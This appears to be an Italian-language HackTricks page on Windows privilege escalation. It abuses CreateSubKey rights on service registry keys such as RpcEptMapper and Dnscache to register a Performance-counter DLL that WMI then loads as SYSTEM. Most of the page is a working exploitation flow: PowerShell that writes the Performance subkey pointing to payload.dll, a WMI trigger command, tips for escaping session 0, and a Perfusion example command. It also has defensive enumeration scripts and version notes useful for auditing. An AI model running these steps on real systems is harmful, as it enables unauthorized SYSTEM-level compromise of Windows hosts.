# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Il post originale è** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

Se hai solo **`Create Subkey`** / **`AppendData/AddSubdirectory`** su una chiave di registro di un servizio, questa è comunque una buona pista per privesc. Di solito **non puoi** sovrascrivere direttamente `ImagePath`, `ServiceDll` o altri valori esistenti, ma potresti comunque riuscire a creare una chiave figlia **`Performance`** sotto:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Qualsiasi altra chiave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** in cui il tuo token ha **`KEY_CREATE_SUB_KEY`**

Il trucco è che Windows supporta ancora il vecchio modello di registrazione **PerfLib V1**. Se un servizio ha una sottochiave **`Performance`**, Windows può caricare da lì una DLL quando un consumer dei contatori di performance richiede i dati.

Secondo la documentazione Microsoft, la registrazione minima è:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Quindi il punto offensivo è: **non scartare un finding sul service registry solo perché hai ottenuto `CreateSubKey` invece di `SetValue`**.

## Perché questo basta per il code execution

La sottochiave `Performance` di solito **non** esiste di default su questi servizi, quindi **`KEY_CREATE_SUB_KEY`** è il primitive di cui hai bisogno. Una volta che la chiave esiste e contiene `Library`/`Open`/`Collect`/`Close`, qualsiasi **performance counter consumer** può triggerare il caricamento della DLL.

Alcuni dettagli importanti:

- Il valore **`Library`** può puntare a un **percorso DLL completo**.
- La DLL deve esportare **`OpenPerfData`**, **`CollectPerfData`** e **`ClosePerfData`** e restituire `ERROR_SUCCESS`.
- Il codice gira nel **contesto del consumer**, **non necessariamente nel processo del servizio vulnerabile stesso**.
- Nel classico caso `RpcEptMapper` / `Dnscache`, una **WMI performance query** può far caricare a **`wmiprvse.exe`** la DLL come **`NT AUTHORITY\SYSTEM`**.

Ecco perché questo primitive è facile da non notare durante il triage: la chiave del servizio padre non è "completamente scrivibile", ma è comunque weaponizable.

## Quick enumeration

Controllo manuale con **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Esempio PowerShell per cercare principal a basso privilegio con **`CreateSubKey`** sulle chiavi dei servizi:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Strumenti utili:

- **PrivescCheck**: `Get-ModifiableRegistryPath` è stato creato specificamente per individuare questa classe di problema.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatizza il drop della DLL, la registrazione `Performance`, il trigger WMI, la duplicazione del token e la cleanup su target legacy vulnerabili (ad esempio: `Perfusion.exe -c cmd -i -k Dnscache`).

## Flusso di abuso

Crea la sottochiave `Performance` e popola i valori richiesti:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Poi attiva un consumer di performance **privilegiato**. Un esempio classico è una query WMI sulle classi `Win32_Perf*`:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Note operative:

- Avviare **`perfmon.exe`** è utile per verificare che la registrazione del counter sia corretta, ma di solito carica la DLL solo nel **tuo contesto utente**.
- Per una vera LPE, attiva un consumer **privilegiato** come **WMI**.
- Se stai scrivendo il tuo exploit, avviare `cmd.exe` direttamente dall'interno della DLL di solito ti lascia con una shell in **session 0**. `Perfusion` risolve questo duplicando il token privilegiato in un processo creato sospeso nella sessione dell'attaccante.
- Abbina l'architettura della DLL al consumer target (**x64 su sistemi x64**).

## Note sulle versioni / sviluppi recenti

Storicamente, le weak keys integrate erano:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` e `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` nota che gli aggiornamenti di **aprile 2021** hanno rimosso il percorso di exploitation facile su **Windows 8 / Windows Server 2012** aggiornati, mentre **Windows 7 / Windows Server 2008 R2** rimanevano exploitabili tramite **`Dnscache`**.

Questo primitive **non è solo storico**. A **gennaio 2025**, Microsoft ha corretto un problema AD DS correlato in cui i membri di **`Network Configuration Operators`** potevano creare subkeys sotto **`Dnscache`** e **`NetBT`**, e la stessa idea di **Performance-counter DLL registration** poteva essere riutilizzata per arrivare a **SYSTEM** sui sistemi supportati.

Quindi la lezione moderna è generica: ogni volta che un principal a basso privilegio ha **`CreateSubKey`** su **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, verifica se una child key **`Performance`** è sufficiente prima di scartare il finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
